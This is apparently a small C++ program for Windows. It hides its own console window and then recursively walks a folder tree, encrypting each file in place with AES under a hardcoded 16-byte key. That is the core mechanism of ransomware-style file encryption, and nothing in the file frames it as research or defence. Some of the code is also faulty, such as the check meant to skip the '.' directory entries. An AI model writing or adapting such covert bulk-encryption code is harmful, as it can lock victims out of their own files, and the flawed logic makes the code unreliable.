#include <Windows.h>
#include <iostream>
#include "AES.h"

void ecrypt(wchar_t *address, unsigned char *key, unsigned char *expandedKey)
{
	_WIN32_FIND_DATAW file;
	HANDLE search_handle = FindFirstFileW(address, &file);
	if (search_handle)
	{
		while (FindNextFileW(search_handle, &file))
		{
			if (file.cFileName[0] != '.' || (file.cFileName[0] != '.' && file.cFileName[1] != '.'))
			{
				int len = wcslen(address) + wcslen(file.cFileName) + 2;
				int len1 = wcslen(file.cFileName);
				int len2 = wcslen(address);
				wchar_t *new_address = new wchar_t[len];
				int j = 0;
				for (int i = 0; i<len; i++)
				{
					if (i < (wcslen(address) - 1))
					{
						new_address[i] = address[i];
					}
					else
					{
						if (i == (len - 1))
						{
							new_address[i] = '\0';
						}
						else if (i == (len - 2))
						{
							new_address[i] = '*';
						}
						else if (i == (len - 3))
						{
							new_address[i] = '\\';
						}
						else
						{
							new_address[i] = file.cFileName[j];
							j++;
						}
					}

				}
				wchar_t *attribute = new wchar_t[len - 2];
				for (int i = 0; i < (len - 3); i++)
				{
					attribute[i] = new_address[i];
				}
				attribute[len - 3] = '\0';
				if (GetFileAttributesW(attribute) == (0x10))
				{
					ecrypt(new_address, key, expandedKey);
				}
				else
				{
					aes_efile(attribute, key, expandedKey);
				}
				delete[]new_address;
				delete[]attribute;

			}
		}
		FindClose(search_handle);
	}
}

int main()
{
	HWND console_handle = GetConsoleWindow();
	ShowWindow(console_handle, SW_HIDE);

	wchar_t address[] = L"D:\\Chaos\\thái dương\\*";
	unsigned char key[16] =
	{
		1,2,3,4,
		5,6,7,8,
		9,10,11,12,
		13,14,15,16
	};
	unsigned char expandedKey[176];
	KeyExpansion(key, expandedKey);	
	ecrypt(address, key, expandedKey);
	return 0;

}